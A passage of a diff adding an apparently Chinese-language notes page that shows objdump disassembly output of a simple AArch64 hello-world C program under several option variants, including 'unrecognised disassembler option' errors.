+00000000000005f0 &lt;__libc_start_main@plt&gt;:
+ 5f0:	90000090 	adrp	x16, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 5f4:	f947d611 	ldr	x17, [x16, #4008]
+ 5f8:	913ea210 	add	x16, x16, #0xfa8
+ 5fc:	d61f0220 	br	x17
+
+0000000000000600 &lt;__cxa_finalize@plt&gt;:
+ 600:	90000090 	adrp	x16, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 604:	f947da11 	ldr	x17, [x16, #4016]
+ 608:	913ec210 	add	x16, x16, #0xfb0
+ 60c:	d61f0220 	br	x17
+
+0000000000000610 &lt;__gmon_start__@plt&gt;:
+ 610:	90000090 	adrp	x16, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 614:	f947de11 	ldr	x17, [x16, #4024]
+ 618:	913ee210 	add	x16, x16, #0xfb8
+ 61c:	d61f0220 	br	x17
+
+0000000000000620 &lt;abort@plt&gt;:
+ 620:	90000090 	adrp	x16, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 624:	f947e211 	ldr	x17, [x16, #4032]
+ 628:	913f0210 	add	x16, x16, #0xfc0
+ 62c:	d61f0220 	br	x17
+
+0000000000000630 &lt;puts@plt&gt;:
+ 630:	90000090 	adrp	x16, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 634:	f947e611 	ldr	x17, [x16, #4040]
+ 638:	913f2210 	add	x16, x16, #0xfc8
+ 63c:	d61f0220 	br	x17
+
+Disassembly of section .text:
+
+0000000000000640 &lt;_start&gt;:
+ 640:	d503201f 	nop
+ 644:	d280001d 	mov	x29, #0x0                   	// #0
+ 648:	d280001e 	mov	x30, #0x0                   	// #0
+ 64c:	aa0003e5 	mov	x5, x0
+ 650:	f94003e1 	ldr	x1, [sp]
+ 654:	910023e2 	add	x2, sp, #0x8
+ 658:	910003e6 	mov	x6, sp
+ 65c:	90000080 	adrp	x0, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 660:	f947f800 	ldr	x0, [x0, #4080]
+ 664:	d2800003 	mov	x3, #0x0                   	// #0
+ 668:	d2800004 	mov	x4, #0x0                   	// #0
+ 66c:	97ffffe1 	bl	5f0 &lt;__libc_start_main@plt&gt;
+ 670:	97ffffec 	bl	620 &lt;abort@plt&gt;
+
+0000000000000674 &lt;call_weak_fn&gt;:
+ 674:	90000080 	adrp	x0, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 678:	f947f400 	ldr	x0, [x0, #4072]
+ 67c:	b4000040 	cbz	x0, 684 &lt;call_weak_fn+0x10&gt;
+ 680:	17ffffe4 	b	610 &lt;__gmon_start__@plt&gt;
+ 684:	d65f03c0 	ret
+ 688:	d503201f 	nop
+ 68c:	d503201f 	nop
+
+0000000000000690 &lt;deregister_tm_clones&gt;:
+ 690:	b0000080 	adrp	x0, 11000 &lt;__data_start&gt;
+ 694:	91004000 	add	x0, x0, #0x10
+ 698:	b0000081 	adrp	x1, 11000 &lt;__data_start&gt;
+ 69c:	91004021 	add	x1, x1, #0x10
+ 6a0:	eb00003f 	cmp	x1, x0
+ 6a4:	540000c0 	b.eq	6bc &lt;deregister_tm_clones+0x2c&gt;  // b.none
+ 6a8:	90000081 	adrp	x1, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 6ac:	f947ec21 	ldr	x1, [x1, #4056]
+ 6b0:	b4000061 	cbz	x1, 6bc &lt;deregister_tm_clones+0x2c&gt;
+ 6b4:	aa0103f0 	mov	x16, x1
+ 6b8:	d61f0200 	br	x16
+ 6bc:	d65f03c0 	ret
+
+00000000000006c0 &lt;register_tm_clones&gt;:
+ 6c0:	b0000080 	adrp	x0, 11000 &lt;__data_start&gt;
+ 6c4:	91004000 	add	x0, x0, #0x10
+ 6c8:	b0000081 	adrp	x1, 11000 &lt;__data_start&gt;
+ 6cc:	91004021 	add	x1, x1, #0x10
+ 6d0:	cb000021 	sub	x1, x1, x0
+ 6d4:	d37ffc22 	lsr	x2, x1, #63
+ 6d8:	8b810c41 	add	x1, x2, x1, asr #3
+ 6dc:	9341fc21 	asr	x1, x1, #1
+ 6e0:	b40000c1 	cbz	x1, 6f8 &lt;register_tm_clones+0x38&gt;
+ 6e4:	90000082 	adrp	x2, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 6e8:	f947fc42 	ldr	x2, [x2, #4088]
+ 6ec:	b4000062 	cbz	x2, 6f8 &lt;register_tm_clones+0x38&gt;
+ 6f0:	aa0203f0 	mov	x16, x2
+ 6f4:	d61f0200 	br	x16
+ 6f8:	d65f03c0 	ret
+ 6fc:	d503201f 	nop
+
+0000000000000700 &lt;__do_global_dtors_aux&gt;:
+ 700:	a9be7bfd 	stp	x29, x30, [sp, #-32]!
+ 704:	910003fd 	mov	x29, sp
+ 708:	f9000bf3 	str	x19, [sp, #16]
+ 70c:	b0000093 	adrp	x19, 11000 &lt;__data_start&gt;
+ 710:	39404260 	ldrb	w0, [x19, #16]
+ 714:	35000140 	cbnz	w0, 73c &lt;__do_global_dtors_aux+0x3c&gt;
+ 718:	90000080 	adrp	x0, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 71c:	f947f000 	ldr	x0, [x0, #4064]
+ 720:	b4000080 	cbz	x0, 730 &lt;__do_global_dtors_aux+0x30&gt;
+ 724:	b0000080 	adrp	x0, 11000 &lt;__data_start&gt;
+ 728:	f9400400 	ldr	x0, [x0, #8]
+ 72c:	97ffffb5 	bl	600 &lt;__cxa_finalize@plt&gt;
+ 730:	97ffffd8 	bl	690 &lt;deregister_tm_clones&gt;
+ 734:	52800020 	mov	w0, #0x1                   	// #1
+ 738:	39004260 	strb	w0, [x19, #16]
+ 73c:	f9400bf3 	ldr	x19, [sp, #16]
+ 740:	a8c27bfd 	ldp	x29, x30, [sp], #32
+ 744:	d65f03c0 	ret
+ 748:	d503201f 	nop
+ 74c:	d503201f 	nop
+
+0000000000000750 &lt;frame_dummy&gt;:
+ 750:	17ffffdc 	b	6c0 &lt;register_tm_clones&gt;
+
+0000000000000754 &lt;main&gt;:
+//PLAYGROUND.c
+#include &lt;stdio.h&gt;
+int main()&#123;
+ 754:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
+ 758:	910003fd 	mov	x29, sp
+   printf(&quot;Wu YiHung\n&quot;);
+ 75c:	90000000 	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 760:	911e4000 	add	x0, x0, #0x790
+ 764:	97ffffb3 	bl	630 &lt;puts@plt&gt;
+   return 0;
+ 768:	52800000 	mov	w0, #0x0                   	// #0
+&#125;
+ 76c:	a8c17bfd 	ldp	x29, x30, [sp], #16
+ 770:	d65f03c0 	ret
+
+Disassembly of section .fini:
+
+0000000000000774 &lt;_fini&gt;:
+ 774:	d503201f 	nop
+ 778:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
+ 77c:	910003fd 	mov	x29, sp
+ 780:	a8c17bfd 	ldp	x29, x30, [sp], #16
+ 784:	d65f03c0 	ret
+</code></pre>
+</li>
+</ul>
+</li>
+<li>反編譯2(使用att格式) &#x3D;&#x3D;&gt;<code>objdump -S -M att PLAYGROUND</code> <ul>
+<li>結果2<pre><code class="c++">yih@yih:~/Documents/C$ objdump -S -M att PLAYGROUND
+
+PLAYGROUND:     file format elf64-littleaarch64
+
+
+Disassembly of section .init:
+
+00000000000005b8 &lt;_init&gt;:
+ 5b8:	objdump: unrecognised disassembler option: att
+d503201f 	nop
+ 5bc:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
+ 5c0:	910003fd 	mov	x29, sp
+ 5c4:	9400002c 	bl	674 &lt;call_weak_fn&gt;
+ 5c8:	a8c17bfd 	ldp	x29, x30, [sp], #16
+ 5cc:	d65f03c0 	ret
+
+Disassembly of section .plt:
+
+00000000000005d0 &lt;.plt&gt;:
+ 5d0:	a9bf7bf0 	stp	x16, x30, [sp, #-16]!
+ 5d4:	90000090 	adrp	x16, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 5d8:	f947d211 	ldr	x17, [x16, #4000]
+ 5dc:	913e8210 	add	x16, x16, #0xfa0
+ 5e0:	d61f0220 	br	x17
+ 5e4:	d503201f 	nop
+ 5e8:	d503201f 	nop
+ 5ec:	d503201f 	nop
+
+00000000000005f0 &lt;__libc_start_main@plt&gt;:
+ 5f0:	90000090 	adrp	x16, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 5f4:	f947d611 	ldr	x17, [x16, #4008]
+ 5f8:	913ea210 	add	x16, x16, #0xfa8
+ 5fc:	d61f0220 	br	x17
+
+0000000000000600 &lt;__cxa_finalize@plt&gt;:
+ 600:	90000090 	adrp	x16, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 604:	f947da11 	ldr	x17, [x16, #4016]
+ 608:	913ec210 	add	x16, x16, #0xfb0
+ 60c:	d61f0220 	br	x17
+
+0000000000000610 &lt;__gmon_start__@plt&gt;:
+ 610:	90000090 	adrp	x16, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 614:	f947de11 	ldr	x17, [x16, #4024]
+ 618:	913ee210 	add	x16, x16, #0xfb8
+ 61c:	d61f0220 	br	x17
+
+0000000000000620 &lt;abort@plt&gt;:
+ 620:	90000090 	adrp	x16, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 624:	f947e211 	ldr	x17, [x16, #4032]
+ 628:	913f0210 	add	x16, x16, #0xfc0
+ 62c:	d61f0220 	br	x17
+
+0000000000000630 &lt;puts@plt&gt;:
+ 630:	90000090 	adrp	x16, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 634:	f947e611 	ldr	x17, [x16, #4040]
+ 638:	913f2210 	add	x16, x16, #0xfc8
+ 63c:	d61f0220 	br	x17
+
+Disassembly of section .text:
+
+0000000000000640 &lt;_start&gt;:
+ 640:	d503201f 	nop
+ 644:	d280001d 	mov	x29, #0x0                   	// #0
+ 648:	d280001e 	mov	x30, #0x0                   	// #0
+ 64c:	aa0003e5 	mov	x5, x0
+ 650:	f94003e1 	ldr	x1, [sp]
+ 654:	910023e2 	add	x2, sp, #0x8
+ 658:	910003e6 	mov	x6, sp
+ 65c:	90000080 	adrp	x0, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 660:	f947f800 	ldr	x0, [x0, #4080]
+ 664:	d2800003 	mov	x3, #0x0                   	// #0
+ 668:	d2800004 	mov	x4, #0x0                   	// #0
+ 66c:	97ffffe1 	bl	5f0 &lt;__libc_start_main@plt&gt;
+ 670:	97ffffec 	bl	620 &lt;abort@plt&gt;
+
+0000000000000674 &lt;call_weak_fn&gt;:
+ 674:	90000080 	adrp	x0, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 678:	f947f400 	ldr	x0, [x0, #4072]
+ 67c:	b4000040 	cbz	x0, 684 &lt;call_weak_fn+0x10&gt;
+ 680:	17ffffe4 	b	610 &lt;__gmon_start__@plt&gt;
+ 684:	d65f03c0 	ret
+ 688:	d503201f 	nop
+ 68c:	d503201f 	nop
+
+0000000000000690 &lt;deregister_tm_clones&gt;:
+ 690:	b0000080 	adrp	x0, 11000 &lt;__data_start&gt;
+ 694:	91004000 	add	x0, x0, #0x10
+ 698:	b0000081 	adrp	x1, 11000 &lt;__data_start&gt;
+ 69c:	91004021 	add	x1, x1, #0x10
+ 6a0:	eb00003f 	cmp	x1, x0
+ 6a4:	540000c0 	b.eq	6bc &lt;deregister_tm_clones+0x2c&gt;  // b.none
+ 6a8:	90000081 	adrp	x1, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 6ac:	f947ec21 	ldr	x1, [x1, #4056]
+ 6b0:	b4000061 	cbz	x1, 6bc &lt;deregister_tm_clones+0x2c&gt;
+ 6b4:	aa0103f0 	mov	x16, x1
+ 6b8:	d61f0200 	br	x16
+ 6bc:	d65f03c0 	ret
+
+00000000000006c0 &lt;register_tm_clones&gt;:
+ 6c0:	b0000080 	adrp	x0, 11000 &lt;__data_start&gt;
+ 6c4:	91004000 	add	x0, x0, #0x10
+ 6c8:	b0000081 	adrp	x1, 11000 &lt;__data_start&gt;
+ 6cc:	91004021 	add	x1, x1, #0x10
+ 6d0:	cb000021 	sub	x1, x1, x0
+ 6d4:	d37ffc22 	lsr	x2, x1, #63
+ 6d8:	8b810c41 	add	x1, x2, x1, asr #3
+ 6dc:	9341fc21 	asr	x1, x1, #1
+ 6e0:	b40000c1 	cbz	x1, 6f8 &lt;register_tm_clones+0x38&gt;
+ 6e4:	90000082 	adrp	x2, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 6e8:	f947fc42 	ldr	x2, [x2, #4088]
+ 6ec:	b4000062 	cbz	x2, 6f8 &lt;register_tm_clones+0x38&gt;
+ 6f0:	aa0203f0 	mov	x16, x2
+ 6f4:	d61f0200 	br	x16
+ 6f8:	d65f03c0 	ret
+ 6fc:	d503201f 	nop
+
+0000000000000700 &lt;__do_global_dtors_aux&gt;:
+ 700:	a9be7bfd 	stp	x29, x30, [sp, #-32]!
+ 704:	910003fd 	mov	x29, sp
+ 708:	f9000bf3 	str	x19, [sp, #16]
+ 70c:	b0000093 	adrp	x19, 11000 &lt;__data_start&gt;
+ 710:	39404260 	ldrb	w0, [x19, #16]
+ 714:	35000140 	cbnz	w0, 73c &lt;__do_global_dtors_aux+0x3c&gt;
+ 718:	90000080 	adrp	x0, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 71c:	f947f000 	ldr	x0, [x0, #4064]
+ 720:	b4000080 	cbz	x0, 730 &lt;__do_global_dtors_aux+0x30&gt;
+ 724:	b0000080 	adrp	x0, 11000 &lt;__data_start&gt;
+ 728:	f9400400 	ldr	x0, [x0, #8]
+ 72c:	97ffffb5 	bl	600 &lt;__cxa_finalize@plt&gt;
+ 730:	97ffffd8 	bl	690 &lt;deregister_tm_clones&gt;
+ 734:	52800020 	mov	w0, #0x1                   	// #1
+ 738:	39004260 	strb	w0, [x19, #16]
+ 73c:	f9400bf3 	ldr	x19, [sp, #16]
+ 740:	a8c27bfd 	ldp	x29, x30, [sp], #32
+ 744:	d65f03c0 	ret
+ 748:	d503201f 	nop
+ 74c:	d503201f 	nop
+
+0000000000000750 &lt;frame_dummy&gt;:
+ 750:	17ffffdc 	b	6c0 &lt;register_tm_clones&gt;
+
+0000000000000754 &lt;main&gt;:
+//PLAYGROUND.c
+#include &lt;stdio.h&gt;
+int main()&#123;
+ 754:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
+ 758:	910003fd 	mov	x29, sp
+   printf(&quot;Wu YiHung\n&quot;);
+ 75c:	90000000 	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 760:	911e4000 	add	x0, x0, #0x790
+ 764:	97ffffb3 	bl	630 &lt;puts@plt&gt;
+   return 0;
+ 768:	52800000 	mov	w0, #0x0                   	// #0
+&#125;
+ 76c:	a8c17bfd 	ldp	x29, x30, [sp], #16
+ 770:	d65f03c0 	ret
+
+Disassembly of section .fini:
+
+0000000000000774 &lt;_fini&gt;:
+ 774:	d503201f 	nop
+ 778:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
+ 77c:	910003fd 	mov	x29, sp
+ 780:	a8c17bfd 	ldp	x29, x30, [sp], #16
+ 784:	d65f03c0 	ret
+</code></pre>
+</li>
+</ul>
+</li>
+<li>反編譯3(使用intel格式) &#x3D;&#x3D;&gt;<code>objdump -S -M intel PLAYGROUND</code> <ul>
+<li>結果3<pre><code class="c++">yih@yih:~/Documents/C$ objdump -S -M intel PLAYGROUND
+
+PLAYGROUND:     file format elf64-littleaarch64
+
+
+Disassembly of section .init:
+
+00000000000005b8 &lt;_init&gt;:
+ 5b8:	objdump: unrecognised disassembler option: intel
+d503201f 	nop
+ 5bc:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
+ 5c0:	910003fd 	mov	x29, sp
+ 5c4:	9400002c 	bl	674 &lt;call_weak_fn&gt;
+ 5c8:	a8c17bfd 	ldp	x29, x30, [sp], #16
+ 5cc:	d65f03c0 	ret
+
+Disassembly of section .plt:
+
+00000000000005d0 &lt;.plt&gt;:
+ 5d0:	a9bf7bf0 	stp	x16, x30, [sp, #-16]!
+ 5d4:	90000090 	adrp	x16, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 5d8:	f947d211 	ldr	x17, [x16, #4000]
+ 5dc:	913e8210 	add	x16, x16, #0xfa0
+ 5e0:	d61f0220 	br	x17
+ 5e4:	d503201f 	nop
+ 5e8:	d503201f 	nop
+ 5ec:	d503201f 	nop
+
+00000000000005f0 &lt;__libc_start_main@plt&gt;:
+ 5f0:	90000090 	adrp	x16, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 5f4:	f947d611 	ldr	x17, [x16, #4008]
+ 5f8:	913ea210 	add	x16, x16, #0xfa8
+ 5fc:	d61f0220 	br	x17
+
+0000000000000600 &lt;__cxa_finalize@plt&gt;:
+ 600:	90000090 	adrp	x16, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 604:	f947da11 	ldr	x17, [x16, #4016]
+ 608:	913ec210 	add	x16, x16, #0xfb0
+ 60c:	d61f0220 	br	x17
+
+0000000000000610 &lt;__gmon_start__@plt&gt;:
+ 610:	90000090 	adrp	x16, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 614:	f947de11 	ldr	x17, [x16, #4024]
+ 618:	913ee210 	add	x16, x16, #0xfb8
+ 61c:	d61f0220 	br	x17
+
+0000000000000620 &lt;abort@plt&gt;:
+ 620:	90000090 	adrp	x16, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 624:	f947e211 	ldr	x17, [x16, #4032]
+ 628:	913f0210 	add	x16, x16, #0xfc0
+ 62c:	d61f0220 	br	x17
+
+0000000000000630 &lt;puts@plt&gt;:
+ 630:	90000090 	adrp	x16, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 634:	f947e611 	ldr	x17, [x16, #4040]
+ 638:	913f2210 	add	x16, x16, #0xfc8
+ 63c:	d61f0220 	br	x17
+
+Disassembly of section .text:
+
+0000000000000640 &lt;_start&gt;:
+ 640:	d503201f 	nop
+ 644:	d280001d 	mov	x29, #0x0                   	// #0
+ 648:	d280001e 	mov	x30, #0x0                   	// #0
+ 64c:	aa0003e5 	mov	x5, x0
+ 650:	f94003e1 	ldr	x1, [sp]
+ 654:	910023e2 	add	x2, sp, #0x8
+ 658:	910003e6 	mov	x6, sp
+ 65c:	90000080 	adrp	x0, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 660:	f947f800 	ldr	x0, [x0, #4080]
+ 664:	d2800003 	mov	x3, #0x0                   	// #0
+ 668:	d2800004 	mov	x4, #0x0                   	// #0
+ 66c:	97ffffe1 	bl	5f0 &lt;__libc_start_main@plt&gt;
+ 670:	97ffffec 	bl	620 &lt;abort@plt&gt;
+0000000000000674 &lt;call_weak_fn&gt;:
+ 674:	90000080 	adrp	x0, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 678:	f947f400 	ldr	x0, [x0, #4072]
+ 67c:	b4000040 	cbz	x0, 684 &lt;call_weak_fn+0x10&gt;
+ 680:	17ffffe4 	b	610 &lt;__gmon_start__@plt&gt;
+ 684:	d65f03c0 	ret
+ 688:	d503201f 	nop
+ 68c:	d503201f 	nop
+
+0000000000000690 &lt;deregister_tm_clones&gt;:
+ 690:	b0000080 	adrp	x0, 11000 &lt;__data_start&gt;
+ 694:	91004000 	add	x0, x0, #0x10
+ 698:	b0000081 	adrp	x1, 11000 &lt;__data_start&gt;
+ 69c:	91004021 	add	x1, x1, #0x10
+ 6a0:	eb00003f 	cmp	x1, x0
+ 6a4:	540000c0 	b.eq	6bc &lt;deregister_tm_clones+0x2c&gt;  // b.none
+ 6a8:	90000081 	adrp	x1, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 6ac:	f947ec21 	ldr	x1, [x1, #4056]
+ 6b0:	b4000061 	cbz	x1, 6bc &lt;deregister_tm_clones+0x2c&gt;
+ 6b4:	aa0103f0 	mov	x16, x1
+ 6b8:	d61f0200 	br	x16
+ 6bc:	d65f03c0 	ret
+
+00000000000006c0 &lt;register_tm_clones&gt;:
+ 6c0:	b0000080 	adrp	x0, 11000 &lt;__data_start&gt;
+ 6c4:	91004000 	add	x0, x0, #0x10
+ 6c8:	b0000081 	adrp	x1, 11000 &lt;__data_start&gt;
+ 6cc:	91004021 	add	x1, x1, #0x10
+ 6d0:	cb000021 	sub	x1, x1, x0
+ 6d4:	d37ffc22 	lsr	x2, x1, #63
+ 6d8:	8b810c41 	add	x1, x2, x1, asr #3
+ 6dc:	9341fc21 	asr	x1, x1, #1
+ 6e0:	b40000c1 	cbz	x1, 6f8 &lt;register_tm_clones+0x38&gt;
+ 6e4:	90000082 	adrp	x2, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 6e8:	f947fc42 	ldr	x2, [x2, #4088]
+ 6ec:	b4000062 	cbz	x2, 6f8 &lt;register_tm_clones+0x38&gt;
+ 6f0:	aa0203f0 	mov	x16, x2
+ 6f4:	d61f0200 	br	x16
+ 6f8:	d65f03c0 	ret
+ 6fc:	d503201f 	nop
+
+0000000000000700 &lt;__do_global_dtors_aux&gt;:
+ 700:	a9be7bfd 	stp	x29, x30, [sp, #-32]!
+ 704:	910003fd 	mov	x29, sp
+ 708:	f9000bf3 	str	x19, [sp, #16]
+ 70c:	b0000093 	adrp	x19, 11000 &lt;__data_start&gt;
+ 710:	39404260 	ldrb	w0, [x19, #16]
+ 714:	35000140 	cbnz	w0, 73c &lt;__do_global_dtors_aux+0x3c&gt;
+ 718:	90000080 	adrp	x0, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 71c:	f947f000 	ldr	x0, [x0, #4064]
+ 720:	b4000080 	cbz	x0, 730 &lt;__do_global_dtors_aux+0x30&gt;
+ 724:	b0000080 	adrp	x0, 11000 &lt;__data_start&gt;
+ 728:	f9400400 	ldr	x0, [x0, #8]
+ 72c:	97ffffb5 	bl	600 &lt;__cxa_finalize@plt&gt;
+ 730:	97ffffd8 	bl	690 &lt;deregister_tm_clones&gt;
+ 734:	52800020 	mov	w0, #0x1                   	// #1
+ 738:	39004260 	strb	w0, [x19, #16]
+ 73c:	f9400bf3 	ldr	x19, [sp, #16]
+ 740:	a8c27bfd 	ldp	x29, x30, [sp], #32
+ 744:	d65f03c0 	ret
+ 748:	d503201f 	nop
+ 74c:	d503201f 	nop
+
+0000000000000750 &lt;frame_dummy&gt;:
+ 750:	17ffffdc 	b	6c0 &lt;register_tm_clones&gt;
+
+0000000000000754 &lt;main&gt;:
+//PLAYGROUND.c
+#include &lt;stdio.h&gt;
+int main()&#123;
+ 754:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
+ 758:	910003fd 	mov	x29, sp
+   printf(&quot;Wu YiHung\n&quot;);
+ 75c:	90000000 	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 760:	911e4000 	add	x0, x0, #0x790
+ 764:	97ffffb3 	bl	630 &lt;puts@plt&gt;
+   return 0;
+ 768:	52800000 	mov	w0, #0x0                   	// #0
+&#125;
+ 76c:	a8c17bfd 	ldp	x29, x30, [sp], #16
+ 770:	d65f03c0 	ret
+
+Disassembly of section .fini:
+
+0000000000000774 &lt;_fini&gt;:
+ 774:	d503201f 	nop
+ 778:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
+ 77c:	910003fd 	mov	x29, sp
+ 780:	a8c17bfd 	ldp	x29, x30, [sp], #16
+ 784:	d65f03c0 	ret
+</code></pre>
+</li>
+</ul>
+</li>
+<li>反編譯4 &#x3D;&#x3D;&gt; <code>objdump -S -j .text -M intel PLAYGROUND</code> <ul>
+<li>結果4<pre><code class="c++">yih@yih:~/Documents/C$ objdump -S -j .text -M intel PLAYGROUND
+
+PLAYGROUND:     file format elf64-littleaarch64
+
+
+Disassembly of section .text:
+
+0000000000000640 &lt;_start&gt;:
+ 640:	objdump: unrecognised disassembler option: intel
+d503201f 	nop
+ 644:	d280001d 	mov	x29, #0x0                   	// #0
+ 648:	d280001e 	mov	x30, #0x0                   	// #0
+ 64c:	aa0003e5 	mov	x5, x0
+ 650:	f94003e1 	ldr	x1, [sp]
+ 654:	910023e2 	add	x2, sp, #0x8
+ 658:	910003e6 	mov	x6, sp
+ 65c:	90000080 	adrp	x0, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 660:	f947f800 	ldr	x0, [x0, #4080]
+ 664:	d2800003 	mov	x3, #0x0                   	// #0
+ 668:	d2800004 	mov	x4, #0x0                   	// #0
+ 66c:	97ffffe1 	bl	5f0 &lt;__libc_start_main@plt&gt;
+ 670:	97ffffec 	bl	620 &lt;abort@plt&gt;
+
+0000000000000674 &lt;call_weak_fn&gt;:
+ 674:	90000080 	adrp	x0, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 678:	f947f400 	ldr	x0, [x0, #4072]
+ 67c:	b4000040 	cbz	x0, 684 &lt;call_weak_fn+0x10&gt;
+ 680:	17ffffe4 	b	610 &lt;__gmon_start__@plt&gt;
+ 684:	d65f03c0 	ret
+ 688:	d503201f 	nop
+ 68c:	d503201f 	nop
+
+0000000000000690 &lt;deregister_tm_clones&gt;:
+ 690:	b0000080 	adrp	x0, 11000 &lt;__data_start&gt;
+ 694:	91004000 	add	x0, x0, #0x10
+ 698:	b0000081 	adrp	x1, 11000 &lt;__data_start&gt;
+ 69c:	91004021 	add	x1, x1, #0x10
+ 6a0:	eb00003f 	cmp	x1, x0
+ 6a4:	540000c0 	b.eq	6bc &lt;deregister_tm_clones+0x2c&gt;  // b.none
+ 6a8:	90000081 	adrp	x1, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 6ac:	f947ec21 	ldr	x1, [x1, #4056]
+ 6b0:	b4000061 	cbz	x1, 6bc &lt;deregister_tm_clones+0x2c&gt;
+ 6b4:	aa0103f0 	mov	x16, x1
+ 6b8:	d61f0200 	br	x16
+ 6bc:	d65f03c0 	ret
+
+00000000000006c0 &lt;register_tm_clones&gt;:
+ 6c0:	b0000080 	adrp	x0, 11000 &lt;__data_start&gt;
+ 6c4:	91004000 	add	x0, x0, #0x10
+ 6c8:	b0000081 	adrp	x1, 11000 &lt;__data_start&gt;
+ 6cc:	91004021 	add	x1, x1, #0x10
+ 6d0:	cb000021 	sub	x1, x1, x0
+ 6d4:	d37ffc22 	lsr	x2, x1, #63
+ 6d8:	8b810c41 	add	x1, x2, x1, asr #3
+ 6dc:	9341fc21 	asr	x1, x1, #1
+ 6e0:	b40000c1 	cbz	x1, 6f8 &lt;register_tm_clones+0x38&gt;
+ 6e4:	90000082 	adrp	x2, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 6e8:	f947fc42 	ldr	x2, [x2, #4088]
+ 6ec:	b4000062 	cbz	x2, 6f8 &lt;register_tm_clones+0x38&gt;
+ 6f0:	aa0203f0 	mov	x16, x2
+ 6f4:	d61f0200 	br	x16
+ 6f8:	d65f03c0 	ret
+ 6fc:	d503201f 	nop
+
+0000000000000700 &lt;__do_global_dtors_aux&gt;:
+ 700:	a9be7bfd 	stp	x29, x30, [sp, #-32]!
+ 704:	910003fd 	mov	x29, sp
+ 708:	f9000bf3 	str	x19, [sp, #16]
+ 70c:	b0000093 	adrp	x19, 11000 &lt;__data_start&gt;
+ 710:	39404260 	ldrb	w0, [x19, #16]
+ 714:	35000140 	cbnz	w0, 73c &lt;__do_global_dtors_aux+0x3c&gt;
+ 718:	90000080 	adrp	x0, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 71c:	f947f000 	ldr	x0, [x0, #4064]
+ 720:	b4000080 	cbz	x0, 730 &lt;__do_global_dtors_aux+0x30&gt;
+ 724:	b0000080 	adrp	x0, 11000 &lt;__data_start&gt;
+ 728:	f9400400 	ldr	x0, [x0, #8]
+ 72c:	97ffffb5 	bl	600 &lt;__cxa_finalize@plt&gt;
+ 730:	97ffffd8 	bl	690 &lt;deregister_tm_clones&gt;
+ 734:	52800020 	mov	w0, #0x1                   	// #1
+ 738:	39004260 	strb	w0, [x19, #16]
+ 73c:	f9400bf3 	ldr	x19, [sp, #16]
+ 740:	a8c27bfd 	ldp	x29, x30, [sp], #32
+ 744:	d65f03c0 	ret
+ 748:	d503201f 	nop
+ 74c:	d503201f 	nop
+
+0000000000000750 &lt;frame_dummy&gt;:
+ 750:	17ffffdc 	b	6c0 &lt;register_tm_clones&gt;
+
+0000000000000754 &lt;main&gt;:
+//PLAYGROUND.c
+#include &lt;stdio.h&gt;
+int main()&#123;
+ 754:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
+ 758:	910003fd 	mov	x29, sp
+   printf(&quot;Wu YiHung\n&quot;);
+ 75c:	90000000 	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 760:	911e4000 	add	x0, x0, #0x790
+ 764:	97ffffb3 	bl	630 &lt;puts@plt&gt;
+   return 0;
+ 768:	52800000 	mov	w0, #0x0                   	// #0
+&#125;
+ 76c:	a8c17bfd 	ldp	x29, x30, [sp], #16
+ 770:	d65f03c0 	ret
+</code></pre>
+</li>
+</ul>
+</li>
+<li>反編譯5 &#x3D;&#x3D;&gt; <code>objdump -S -j .text -M intel PLAYGROUND --no-show-raw-insn</code><ul>
+<li>結果5<pre><code class="c++">yih@yih:~/Documents/C$ objdump -S -j .text -M intel PLAYGROUND --no-show-raw-insn
+
+PLAYGROUND:     file format elf64-littleaarch64
+
+
+Disassembly of section .text:
+
+0000000000000640 &lt;_start&gt;:
+ 640:	objdump: unrecognised disassembler option: intel
+nop
+ 644:	mov	x29, #0x0                   	// #0
+ 648:	mov	x30, #0x0                   	// #0
+ 64c:	mov	x5, x0
+ 650:	ldr	x1, [sp]
+ 654:	add	x2, sp, #0x8
+ 658:	mov	x6, sp
+ 65c:	adrp	x0, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 660:	ldr	x0, [x0, #4080]
